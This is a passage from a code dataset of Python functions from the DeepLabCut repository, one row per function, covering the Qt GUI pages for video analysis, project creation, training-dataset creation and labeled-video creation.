            fig.savefig(os.path.join(tmpfolder, imagename.replace('.png', f'_{color_by}.png')), dpi=dpi)
            plt.close(fig)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(AnalyzeVideos, self).__init__(root, parent, h1_description)
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.video_selection_widget.files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    tmp_layout = _create_horizontal_layout()
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_grid_layout()
    self._generate_layout_attributes(self.layout_attributes)
    tmp_layout.addLayout(self.layout_attributes)
    self.layout_singleanimal = _create_horizontal_layout()
    self.layout_multianimal = _create_horizontal_layout()
    if self.root.is_multianimal:
        self._generate_layout_multianimal(self.layout_multianimal)
        tmp_layout.addLayout(self.layout_multianimal)
    else:
        self._generate_layout_single_animal(self.layout_singleanimal)
        tmp_layout.addLayout(self.layout_singleanimal)
    self.main_layout.addLayout(tmp_layout)
    self.main_layout.addWidget(_create_label_widget('', 'font:bold'))
    self.layout_other_options = _create_vertical_layout()
    self._generate_layout_other_options(self.layout_other_options)
    self.main_layout.addLayout(self.layout_other_options)
    self.analyze_videos_btn = QtWidgets.QPushButton('Analyze Videos')
    self.analyze_videos_btn.clicked.connect(self.analyze_videos)
    self.edit_config_file_btn = QtWidgets.QPushButton('Edit config.yaml')
    self.edit_config_file_btn.clicked.connect(self.edit_config_file)
    self.main_layout.addWidget(self.analyze_videos_btn, alignment=Qt.AlignRight)
    self.main_layout.addWidget(self.edit_config_file_btn, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.analyze_videos.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_single_animal,"def _generate_layout_single_animal(self, layout):
    self.crop_bodyparts = QtWidgets.QCheckBox('Dynamically crop bodyparts')
    self.crop_bodyparts.setCheckState(Qt.Unchecked)
    self.crop_bodyparts.stateChanged.connect(self.update_crop_choice)
    self.dynamic_cropping = False
    layout.addWidget(self.crop_bodyparts)"
AlexEMG/DeepLabCut,_generate_layout_other_options,"def _generate_layout_other_options(self, layout):
    tmp_layout = _create_horizontal_layout(margins=(0, 0, 0, 0))
    self.save_as_csv = QtWidgets.QCheckBox('Save result(s) as csv')
    self.save_as_csv.setCheckState(Qt.Unchecked)
    self.save_as_csv.stateChanged.connect(self.update_csv_choice)
    tmp_layout.addWidget(self.save_as_csv)
    self.save_as_nwb = QtWidgets.QCheckBox('Save result(s) as nwb')
    self.save_as_nwb.setCheckState(Qt.Unchecked)
    self.save_as_nwb.stateChanged.connect(self.update_nwb_choice)
    tmp_layout.addWidget(self.save_as_csv)
    self.filter_predictions = QtWidgets.QCheckBox('Filter predictions')
    self.filter_predictions.setCheckState(Qt.Unchecked)
    self.filter_predictions.stateChanged.connect(self.update_filter_choice)
    tmp_layout.addWidget(self.filter_predictions)
    self.plot_trajectories = QtWidgets.QCheckBox('Plot trajectories')
    self.plot_trajectories.setCheckState(Qt.Unchecked)
    self.plot_trajectories.stateChanged.connect(self.update_plot_trajectory_choice)
    tmp_layout.addWidget(self.plot_trajectories)
    self.show_trajectory_plots = QtWidgets.QCheckBox('Show trajectory plots')
    self.show_trajectory_plots.setCheckState(Qt.Unchecked)
    self.show_trajectory_plots.setEnabled(False)
    self.show_trajectory_plots.stateChanged.connect(self.update_showfigs_choice)
    tmp_layout.addWidget(self.show_trajectory_plots)
    layout.addLayout(tmp_layout)
    self.bodyparts_list_widget = BodypartListWidget(root=self.root, parent=self)
    layout.addWidget(self.bodyparts_list_widget, Qt.AlignLeft)"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    opt_text = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    layout.addWidget(opt_text, 0, 0)
    layout.addWidget(self.shuffle, 0, 1)"
AlexEMG/DeepLabCut,_generate_layout_multianimal,"def _generate_layout_multianimal(self, layout):
    tmp_layout = QtWidgets.QGridLayout()
    opt_text = QtWidgets.QLabel('Tracking method')
    self.tracker_type_widget = QtWidgets.QComboBox()
    self.tracker_type_widget.addItems(['ellipse', 'box', 'skeleton'])
    self.tracker_type_widget.currentTextChanged.connect(self.update_tracker_type)
    tmp_layout.addWidget(opt_text, 0, 0)
    tmp_layout.addWidget(self.tracker_type_widget, 0, 1)
    opt_text = QtWidgets.QLabel('Number of animals in videos')
    self.num_animals_in_videos = QtWidgets.QSpinBox()
    self.num_animals_in_videos.setMaximum(100)
    self.num_animals_in_videos.setValue(len(self.root.all_individuals))
    tmp_layout.addWidget(opt_text, 1, 0)
    tmp_layout.addWidget(self.num_animals_in_videos, 1, 1)
    self.calibrate_assembly_checkbox = QtWidgets.QCheckBox('Calibrate assembly')
    self.calibrate_assembly_checkbox.setCheckState(Qt.Unchecked)
    self.calibrate_assembly_checkbox.stateChanged.connect(self.update_calibrate_assembly)
    tmp_layout.addWidget(self.calibrate_assembly_checkbox, 0, 2)
    self.assemble_with_ID_only_checkbox = QtWidgets.QCheckBox('Assemble with ID only')
    self.assemble_with_ID_only_checkbox.setCheckState(Qt.Unchecked)
    self.assemble_with_ID_only_checkbox.stateChanged.connect(self.update_assemble_with_ID_only)
    tmp_layout.addWidget(self.assemble_with_ID_only_checkbox, 0, 3)
    self.create_detections_video_checkbox = QtWidgets.QCheckBox('Create video with all detections')
    self.create_detections_video_checkbox.setCheckState(Qt.Unchecked)
    self.create_detections_video_checkbox.stateChanged.connect(self.update_create_video_detections)
    tmp_layout.addWidget(self.create_detections_video_checkbox, 0, 4)
    layout.addLayout(tmp_layout)"
AlexEMG/DeepLabCut,update_create_video_detections,"def update_create_video_detections(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Create video with all detections {s}')"
AlexEMG/DeepLabCut,update_assemble_with_ID_only,"def update_assemble_with_ID_only(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Assembly with ID only {s}')"
AlexEMG/DeepLabCut,update_calibrate_assembly,"def update_calibrate_assembly(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Assembly calibration {s}')"
AlexEMG/DeepLabCut,update_tracker_type,"def update_tracker_type(self, method):
    self.root.logger.info(f'Using {method.upper()} tracker')"
AlexEMG/DeepLabCut,update_csv_choice,"def update_csv_choice(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Save results as CSV {s}')"
AlexEMG/DeepLabCut,update_nwb_choice,"def update_nwb_choice(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Save results as NWB {s}')"
AlexEMG/DeepLabCut,update_filter_choice,"def update_filter_choice(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Filtering predictions {s}')"
AlexEMG/DeepLabCut,update_showfigs_choice,"def update_showfigs_choice(self, state):
    if state == Qt.Checked:
        self.root.logger.info('Plots will show as pop ups.')
    else:
        self.root.logger.info('Plots will not show up.')"
AlexEMG/DeepLabCut,update_crop_choice,"def update_crop_choice(self, state):
    if state == Qt.Checked:
        self.root.logger.info('Dynamic bodypart cropping ENABLED.')
        self.dynamic_cropping = True
    else:
        self.root.logger.info('Dynamic bodypart cropping DISABLED.')
        self.dynamic_cropping = False"
AlexEMG/DeepLabCut,update_plot_trajectory_choice,"def update_plot_trajectory_choice(self, state):
    if state == Qt.Checked:
        self.bodyparts_list_widget.show()
        self.bodyparts_list_widget.setEnabled(True)
        self.show_trajectory_plots.setEnabled(True)
        self.root.logger.info('Plot trajectories ENABLED.')
    else:
        self.bodyparts_list_widget.hide()
        self.bodyparts_list_widget.setEnabled(False)
        self.show_trajectory_plots.setEnabled(False)
        self.show_trajectory_plots.setCheckState(Qt.Unchecked)
        self.root.logger.info('Plot trajectories DISABLED.')"
AlexEMG/DeepLabCut,edit_config_file,"def edit_config_file(self):
    if not self.root.config:
        return
    editor = ConfigEditor(self.root.config)
    editor.show()"
AlexEMG/DeepLabCut,analyze_videos,"def analyze_videos(self):
    config = self.root.config
    shuffle = self.root.shuffle_value
    videos = list(self.files)
    save_as_csv = self.save_as_csv.checkState() == Qt.Checked
    videotype = self.video_selection_widget.videotype_widget.currentText()
    if self.root.is_multianimal:
        calibrate_assembly = self.calibrate_assembly_checkbox.checkState() == Qt.Checked
        assemble_with_ID_only = self.assemble_with_ID_only_checkbox.checkState() == Qt.Checked
        track_method = self.tracker_type_widget.currentText()
        edit_config(self.root.config, {'default_track_method': track_method})
        num_animals_in_videos = self.num_animals_in_videos.value()
    else:
        calibrate_assembly = False
        num_animals_in_videos = None
        assemble_with_ID_only = False
    cropping = None
    if self.root.cfg['cropping'] == 'True':
        cropping = (self.root.cfg['x1'], self.root.cfg['x2'], self.root.cfg['y1'], self.root.cfg['y2'])
    dynamic_cropping_params = (False, 0.5, 10)
    try:
        if self.dynamic_cropping:
            dynamic_cropping_params = (True, 0.5, 10)
    except AttributeError:
        pass
    func = partial(deeplabcut.analyze_videos, config, videos=videos, videotype=videotype, shuffle=shuffle, save_as_csv=save_as_csv, cropping=cropping, dynamic=dynamic_cropping_params, auto_track=self.root.is_multianimal, n_tracks=num_animals_in_videos, calibrate=calibrate_assembly, identity_only=assemble_with_ID_only)
    (self.worker, self.thread) = move_to_separate_thread(func)
    self.worker.finished.connect(lambda : self.analyze_videos_btn.setEnabled(True))
    self.worker.finished.connect(lambda : self.root._progress_bar.hide())
    self.worker.finished.connect(lambda : self.run_enabled())
    self.thread.start()
    self.analyze_videos_btn.setEnabled(False)
    self.root._progress_bar.show()"
AlexEMG/DeepLabCut,run_enabled,"def run_enabled(self):
    config = self.root.config
    shuffle = self.root.shuffle_value
    videos = list(self.files)
    save_as_csv = self.save_as_csv.checkState() == Qt.Checked
    save_as_nwb = self.save_as_nwb.checkState() == Qt.Checked
    filter_data = self.filter_predictions.checkState() == Qt.Checked
    videotype = self.video_selection_widget.videotype_widget.currentText()
    try:
        create_video_all_detections = self.create_detections_video_checkbox.checkState() == Qt.Checked
    except AttributeError:
        create_video_all_detections = False
    if create_video_all_detections:
        deeplabcut.create_video_with_all_detections(config, videos=videos, videotype=videotype, shuffle=shuffle)
    if filter_data:
        deeplabcut.filterpredictions(config, video=videos, videotype=videotype, shuffle=shuffle, filtertype='median', windowlength=5, save_as_csv=save_as_csv)
    if self.plot_trajectories.checkState() == Qt.Checked:
        bdpts = self.bodyparts_list_widget.selected_bodyparts
        self.root.logger.debug(f'Selected body parts for plot_trajectories: {bdpts}')
        showfig = self.show_trajectory_plots.checkState() == Qt.Checked
        deeplabcut.plot_trajectories(config, videos=videos, displayedbodyparts=bdpts, videotype=videotype, shuffle=shuffle, filtered=filter_data, showfigures=showfig)
    if self.root.is_multianimal and save_as_csv:
        deeplabcut.analyze_videos_converth5_to_csv(videos, listofvideos=True)
    if save_as_nwb:
        deeplabcut.analyze_videos_converth5_to_nwb(config, videos, listofvideos=True)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, parent):
    super(ProjectCreator, self).__init__(parent)
    self.parent = parent
    self.setWindowTitle('New Project')
    self.setModal(True)
    self.setMinimumWidth(parent.screen_width // 2)
    today = datetime.today().strftime('%Y-%m-%d')
    self.name_default = '-'.join(('{}', '{}', today))
    self.proj_default = ''
    self.exp_default = ''
    self.loc_default = parent.project_folder
    main_layout = QtWidgets.QVBoxLayout(self)
    self.user_frame = self.lay_out_user_frame()
    self.video_frame = self.lay_out_video_frame()
    self.create_button = QtWidgets.QPushButton('Create')
    self.create_button.setDefault(True)
    self.create_button.clicked.connect(self.finalize_project)
    main_layout.addWidget(self.user_frame)
    main_layout.addWidget(self.video_frame)
    main_layout.addWidget(self.create_button, alignment=QtCore.Qt.AlignRight)"
AlexEMG/DeepLabCut,lay_out_user_frame,"def lay_out_user_frame(self):
    user_frame = QtWidgets.QFrame(self)
    user_frame.setFrameShape(user_frame.Shape.StyledPanel)
    user_frame.setLineWidth(0)
    proj_label = QtWidgets.QLabel('Project:', user_frame)
    self.proj_line = QtWidgets.QLineEdit(self.proj_default, user_frame)
    self.proj_line.setPlaceholderText(""my project's name"")
    self._default_style = self.proj_line.styleSheet()
    self.proj_line.textEdited.connect(self.update_project_name)
    exp_label = QtWidgets.QLabel('Experimenter:', user_frame)
    self.exp_line = QtWidgets.QLineEdit(self.exp_default, user_frame)
    self.exp_line.setPlaceholderText('my nickname')
    self.exp_line.textEdited.connect(self.update_experimenter_name)
    loc_label = ClickableLabel('Location:', parent=user_frame)
    loc_label.signal.connect(self.on_click)
    self.loc_line = QtWidgets.QLineEdit(self.loc_default, user_frame)
    self.loc_line.setReadOnly(True)
    action = self.loc_line.addAction(QIcon(os.path.join(BASE_DIR, 'assets', 'icons', 'open2.png')), QtWidgets.QLineEdit.TrailingPosition)
    action.triggered.connect(self.on_click)
    vbox = QtWidgets.QVBoxLayout(user_frame)
    grid = QtWidgets.QGridLayout()
    grid.addWidget(proj_label, 0, 0)
    grid.addWidget(self.proj_line, 0, 1)
    grid.addWidget(exp_label, 1, 0)
    grid.addWidget(self.exp_line, 1, 1)
    grid.addWidget(loc_label, 2, 0)
    grid.addWidget(self.loc_line, 2, 1)
    vbox.addLayout(grid)
    self.madlc_box = QtWidgets.QCheckBox('Is it a multi-animal project?')
    self.madlc_box.setChecked(False)
    vbox.addWidget(self.madlc_box)
    return user_frame"
AlexEMG/DeepLabCut,lay_out_video_frame,"def lay_out_video_frame(self):
    video_frame = ItemSelectionFrame([], self)
    self.cam_combo = QtWidgets.QComboBox(video_frame)
    self.cam_combo.addItems(map(str, (1, 2)))
    self.cam_combo.currentTextChanged.connect(self.check_num_cameras)
    ncam_label = QtWidgets.QLabel('Number of cameras:')
    ncam_label.setBuddy(self.cam_combo)
    self.copy_box = QtWidgets.QCheckBox('Copy videos to project folder')
    self.copy_box.setChecked(False)
    browse_button = QtWidgets.QPushButton('Browse videos')
    browse_button.clicked.connect(self.browse_videos)
    clear_button = QtWidgets.QPushButton('Clear')
    clear_button.clicked.connect(video_frame.fancy_list.clear)
    layout1 = QtWidgets.QHBoxLayout()
    layout1.addWidget(ncam_label)
    layout1.addWidget(self.cam_combo)
    layout2 = QtWidgets.QHBoxLayout()
    layout2.addWidget(browse_button)
    layout2.addWidget(clear_button)
    video_frame.layout.insertLayout(0, layout1)
    video_frame.layout.addLayout(layout2)
    video_frame.layout.addWidget(self.copy_box)
    return video_frame"
AlexEMG/DeepLabCut,browse_videos,"def browse_videos(self):
    folder = QtWidgets.QFileDialog.getExistingDirectory(self, 'Please select a folder', self.loc_default)
    if not folder:
        return
    for video in auxiliaryfunctions.grab_files_in_folder(folder, relative=False):
        if os.path.splitext(video)[1][1:] in DLCParams.VIDEOTYPES[1:]:
            self.video_frame.fancy_list.add_item(video)"
AlexEMG/DeepLabCut,finalize_project,"def finalize_project(self):
    fields = [self.proj_line, self.exp_line]
    empty = [i for (i, field) in enumerate(fields) if not field.text()]
    for (i, field) in enumerate(fields):
        if i in empty:
            field.setStyleSheet('border: 1px solid red;')
        else:
            field.setStyleSheet(self._default_style)
    if empty:
        return
    n_cameras = int(self.cam_combo.currentText())
    try:
        if n_cameras > 1:
            _ = deeplabcut.create_new_project_3d(self.proj_default, self.exp_default, n_cameras, self.loc_default)
        else:
            videos = list(self.video_frame.selected_items)
            if not len(videos):
                print('Add at least a video to the project.')
                self.video_frame.fancy_list.setStyleSheet('border: 1px solid red')
                return
            else:
                self.video_frame.fancy_list.setStyleSheet(self.video_frame.fancy_list._default_style)
            to_copy = self.copy_box.isChecked()
            is_madlc = self.madlc_box.isChecked()
            config = deeplabcut.create_new_project(self.proj_default, self.exp_default, videos, self.loc_default, to_copy, multianimal=is_madlc)
            self.parent.load_config(config)
            self.parent._update_project_state(config=config, loaded=True)
    except FileExistsError:
        print('Project ""{}"" already exists!'.format(self.proj_default))
        return
    msg = QtWidgets.QMessageBox(text=f'New project created')
    msg.setIcon(QtWidgets.QMessageBox.Information)
    msg.exec_()
    self.close()"
AlexEMG/DeepLabCut,on_click,"def on_click(self):
    dirname = QtWidgets.QFileDialog.getExistingDirectory(self, 'Please select a folder', self.loc_default)
    if not dirname:
        return
    self.loc_default = dirname
    self.update_project_location()"
AlexEMG/DeepLabCut,check_num_cameras,"def check_num_cameras(self, value):
    val = int(value)
    for child in self.video_frame.children():
        if child.isWidgetType() and (not isinstance(child, QtWidgets.QComboBox)):
            if val > 1:
                child.setDisabled(True)
            else:
                child.setDisabled(False)"
AlexEMG/DeepLabCut,update_project_name,"def update_project_name(self, text):
    self.proj_default = text
    self.update_project_location()"
AlexEMG/DeepLabCut,update_experimenter_name,"def update_experimenter_name(self, text):
    self.exp_default = text
    self.update_project_location()"
AlexEMG/DeepLabCut,update_project_location,"def update_project_location(self):
    full_name = self.name_default.format(self.proj_default, self.exp_default)
    full_path = os.path.join(self.loc_default, full_name)
    self.loc_line.setText(full_path)"
AlexEMG/DeepLabCut,_create_message_box,"def _create_message_box(text, info_text):
    msg = QtWidgets.QMessageBox()
    msg.setIcon(QtWidgets.QMessageBox.Information)
    msg.setText(text)
    msg.setInformativeText(info_text)
    msg.setWindowTitle('Info')
    msg.setMinimumWidth(900)
    logo_dir = os.path.dirname(os.path.realpath('logo.png')) + os.path.sep
    logo = logo_dir + '/assets/logo.png'
    msg.setWindowIcon(QIcon(logo))
    msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
    return msg"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(CreateTrainingDataset, self).__init__(root, parent, h1_description)
    self.model_comparison = False
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_grid_layout(margins=(20, 0, 0, 0))
    self._generate_layout_attributes(self.layout_attributes)
    self.main_layout.addLayout(self.layout_attributes)
    self.ok_button = QtWidgets.QPushButton('Create Training Dataset')
    self.ok_button.setMinimumWidth(150)
    self.ok_button.clicked.connect(self.create_training_dataset)
    self.main_layout.addWidget(self.ok_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    if self.root.is_multianimal:
        func = deeplabcut.create_multianimaltraining_dataset
    else:
        func = deeplabcut.create_training_dataset
    label = QtWidgets.QLabel(func.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    layout.setColumnMinimumWidth(3, 300)
    shuffle_label = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    augmentation_label = QtWidgets.QLabel('Augmentation method')
    self.aug_choice = QtWidgets.QComboBox()
    self.aug_choice.addItems(DLCParams.IMAGE_AUGMENTERS)
    self.aug_choice.setCurrentText('imgaug')
    self.aug_choice.currentTextChanged.connect(self.log_augmentation_choice)
    nnet_label = QtWidgets.QLabel('Network architecture')
    self.net_choice = QtWidgets.QComboBox()
    nets = DLCParams.NNETS.copy()
    if not self.root.is_multianimal:
        nets.remove('dlcrnet_ms5')
    self.net_choice.addItems(nets)
    self.net_choice.setCurrentText('resnet_50')
    self.net_choice.currentTextChanged.connect(self.log_net_choice)
    layout.addWidget(shuffle_label, 0, 0)
    layout.addWidget(self.shuffle, 0, 1)
    layout.addWidget(nnet_label, 0, 2)
    layout.addWidget(self.net_choice, 0, 3)
    layout.addWidget(augmentation_label, 0, 4)
    layout.addWidget(self.aug_choice, 0, 5)"
AlexEMG/DeepLabCut,log_net_choice,"def log_net_choice(self, net):
    self.root.logger.info(f'Network architecture set to {net.upper()}')"
AlexEMG/DeepLabCut,log_augmentation_choice,"def log_augmentation_choice(self, augmentation):
    self.root.logger.info(f'Image augmentation set to {augmentation.upper()}')"
AlexEMG/DeepLabCut,create_training_dataset,"def create_training_dataset(self):
    shuffle = self.shuffle.value()
    if self.model_comparison:
        raise NotImplementedError
        deeplabcut.create_training_model_comparison(config_file, num_shuffles=shuffle, net_types=self.net_type, augmenter_types=self.aug_type)
    else:
        if self.root.is_multianimal:
            deeplabcut.create_multianimaltraining_dataset(self.root.config, shuffle, Shuffles=[self.shuffle.value()], net_type=self.net_choice.currentText())
        else:
            deeplabcut.create_training_dataset(self.root.config, shuffle, Shuffles=[self.shuffle.value()], net_type=self.net_choice.currentText(), augmenter_type=self.aug_choice.currentText())
        trainingsetfolder = get_training_set_folder(self.root.cfg)
        filenames = list(get_data_and_metadata_filenames(trainingsetfolder, self.root.cfg['TrainingFraction'][0], self.shuffle.value(), self.root.cfg))
        if self.root.is_multianimal:
            filenames[0] = filenames[0].replace('mat', 'pickle')
        if all((os.path.exists(os.path.join(self.root.project_folder, file)) for file in filenames)):
            msg = _create_message_box('The training dataset is successfully created.', ""Use the function 'train_network' to start training. Happy training!"")
            msg.exec_()
            self.root.writer.write('Training dataset successfully created.')
        else:
            msg = _create_message_box('The training dataset could not be created.', 'Make sure there are annotated data under labeled-data.')
            msg.exec_()
            self.root.writer.write('Training dataset creation failed.')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent, h1_description):
    super(CreateVideos, self).__init__(root, parent, h1_description)
    self.bodyparts_to_use = self.root.all_bodyparts
    self._set_page()"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.video_selection_widget.files"
AlexEMG/DeepLabCut,_set_page,"def _set_page(self):
    self.main_layout.addWidget(_create_label_widget('Video Selection', 'font:bold'))
    self.video_selection_widget = VideoSelectionWidget(self.root, self)
    self.main_layout.addWidget(self.video_selection_widget)
    tmp_layout = _create_horizontal_layout()
    self.main_layout.addWidget(_create_label_widget('Attributes', 'font:bold'))
    self.layout_attributes = _create_horizontal_layout(margins=(0, 0, 0, 0))
    self._generate_layout_attributes(self.layout_attributes)
    tmp_layout.addLayout(self.layout_attributes)
    self.layout_multianimal = _create_horizontal_layout()
    if self.root.is_multianimal:
        self._generate_layout_multianimal(self.layout_multianimal)
        tmp_layout.addLayout(self.layout_multianimal)
    self.main_layout.addLayout(tmp_layout)
    self.main_layout.addWidget(_create_label_widget('Video Parameters', 'font:bold'))
    self.layout_video_parameters = _create_vertical_layout()
    self._generate_layout_video_parameters(self.layout_video_parameters)
    self.main_layout.addLayout(self.layout_video_parameters)
    self.sk_button = QtWidgets.QPushButton('Build skeleton')
    self.sk_button.clicked.connect(self.build_skeleton)
    self.main_layout.addWidget(self.sk_button, alignment=Qt.AlignRight)
    self.run_button = QtWidgets.QPushButton('Create videos')
    self.run_button.clicked.connect(self.create_videos)
    self.main_layout.addWidget(self.run_button, alignment=Qt.AlignRight)
    self.help_button = QtWidgets.QPushButton('Help')
    self.help_button.clicked.connect(self.show_help_dialog)
    self.main_layout.addWidget(self.help_button, alignment=Qt.AlignLeft)"
AlexEMG/DeepLabCut,show_help_dialog,"def show_help_dialog(self):
    dialog = QtWidgets.QDialog(self)
    layout = QtWidgets.QVBoxLayout()
    label = QtWidgets.QLabel(deeplabcut.create_labeled_video.__doc__, self)
    scroll = QtWidgets.QScrollArea()
    scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
    scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
    scroll.setWidgetResizable(True)
    scroll.setWidget(label)
    layout.addWidget(scroll)
    dialog.setLayout(layout)
    dialog.exec_()"
AlexEMG/DeepLabCut,_generate_layout_multianimal,"def _generate_layout_multianimal(self, layout):
    tmp_text = QtWidgets.QLabel('Color keypoints by:')
    self.color_by_widget = QtWidgets.QComboBox()
    self.color_by_widget.addItems(['bodypart', 'individual'])
    self.color_by_widget.setCurrentText('bodypart')
    self.color_by_widget.currentTextChanged.connect(self.update_color_by)
    layout.addWidget(tmp_text)
    layout.addWidget(self.color_by_widget)"
AlexEMG/DeepLabCut,_generate_layout_attributes,"def _generate_layout_attributes(self, layout):
    opt_text = QtWidgets.QLabel('Shuffle')
    self.shuffle = ShuffleSpinBox(root=self.root, parent=self)
    layout.addWidget(opt_text)
    layout.addWidget(self.shuffle)
    self.overwrite_videos = QtWidgets.QCheckBox('Overwrite videos')
    self.overwrite_videos.setCheckState(Qt.Unchecked)
    self.overwrite_videos.stateChanged.connect(self.update_overwrite_videos)
    layout.addWidget(self.overwrite_videos)"
AlexEMG/DeepLabCut,_generate_layout_video_parameters,"def _generate_layout_video_parameters(self, layout):
    tmp_layout = _create_horizontal_layout(margins=(0, 0, 0, 0))
    opt_text = QtWidgets.QLabel('Specify the number of trail points')
    self.trail_points = QtWidgets.QSpinBox()
    self.trail_points.setValue(0)
    tmp_layout.addWidget(opt_text)
    tmp_layout.addWidget(self.trail_points)
    layout.addLayout(tmp_layout)
    tmp_layout = _create_vertical_layout(margins=(0, 0, 0, 0))
    self.plot_all_bodyparts = QtWidgets.QCheckBox('Plot all bodyparts')
    self.plot_all_bodyparts.setCheckState(Qt.Checked)
    self.plot_all_bodyparts.stateChanged.connect(self.update_use_all_bodyparts)
    tmp_layout.addWidget(self.plot_all_bodyparts)
    self.draw_skeleton_checkbox = QtWidgets.QCheckBox('Draw skeleton')
    self.draw_skeleton_checkbox.setCheckState(Qt.Checked)
    self.draw_skeleton_checkbox.stateChanged.connect(self.update_draw_skeleton)
    tmp_layout.addWidget(self.draw_skeleton_checkbox)
    self.use_filtered_data_checkbox = QtWidgets.QCheckBox('Use filtered data')
    self.use_filtered_data_checkbox.setCheckState(Qt.Unchecked)
    self.use_filtered_data_checkbox.stateChanged.connect(self.update_use_filtered_data)
    tmp_layout.addWidget(self.use_filtered_data_checkbox)
    self.plot_trajectories = QtWidgets.QCheckBox('Plot trajectories')
    self.plot_trajectories.setCheckState(Qt.Unchecked)
    self.plot_trajectories.stateChanged.connect(self.update_plot_trajectory_choice)
    tmp_layout.addWidget(self.plot_trajectories)
    self.create_high_quality_video = QtWidgets.QCheckBox('High quality video (slow)')
    self.create_high_quality_video.setCheckState(Qt.Unchecked)
    self.create_high_quality_video.stateChanged.connect(self.update_high_quality_video)
    tmp_layout.addWidget(self.create_high_quality_video)
    nested_tmp_layout = _create_horizontal_layout(margins=(0, 0, 0, 0))
    nested_tmp_layout.addLayout(tmp_layout)
    tmp_layout = _create_vertical_layout(margins=(0, 0, 0, 0))
    self.bodyparts_list_widget = BodypartListWidget(root=self.root, parent=self)
    nested_tmp_layout.addWidget(self.bodyparts_list_widget, Qt.AlignLeft)
    tmp_layout.addLayout(nested_tmp_layout, Qt.AlignLeft)
    layout.addLayout(tmp_layout, Qt.AlignLeft)"
AlexEMG/DeepLabCut,update_high_quality_video,"def update_high_quality_video(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'High quality {s}.')"
AlexEMG/DeepLabCut,update_plot_trajectory_choice,"def update_plot_trajectory_choice(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Plot trajectories {s}.')"
AlexEMG/DeepLabCut,update_selected_bodyparts,"def update_selected_bodyparts(self):
    selected_bodyparts = [item.text() for item in self.bodyparts_list_widget.selectedItems()]
    self.root.logger.info(f'Selected bodyparts for plotting:\n\t{selected_bodyparts}')
    self.bodyparts_to_use = selected_bodyparts"
AlexEMG/DeepLabCut,update_use_all_bodyparts,"def update_use_all_bodyparts(self, s):
    if s == Qt.Checked:
        self.bodyparts_list_widget.setEnabled(False)
        self.bodyparts_list_widget.hide()
        self.root.logger.info('Plot all bodyparts ENABLED.')
    else:
        self.bodyparts_list_widget.setEnabled(True)
        self.bodyparts_list_widget.show()
        self.root.logger.info('Plot all bodyparts DISABLED.')"
AlexEMG/DeepLabCut,update_use_filtered_data,"def update_use_filtered_data(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Use filtered data {s}')"
AlexEMG/DeepLabCut,update_draw_skeleton,"def update_draw_skeleton(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Draw skeleton {s}')"
AlexEMG/DeepLabCut,update_overwrite_videos,"def update_overwrite_videos(self, state):
    s = 'ENABLED' if state == Qt.Checked else 'DISABLED'
    self.root.logger.info(f'Overwrite videos {s}')"
AlexEMG/DeepLabCut,update_color_by,"def update_color_by(self, text):
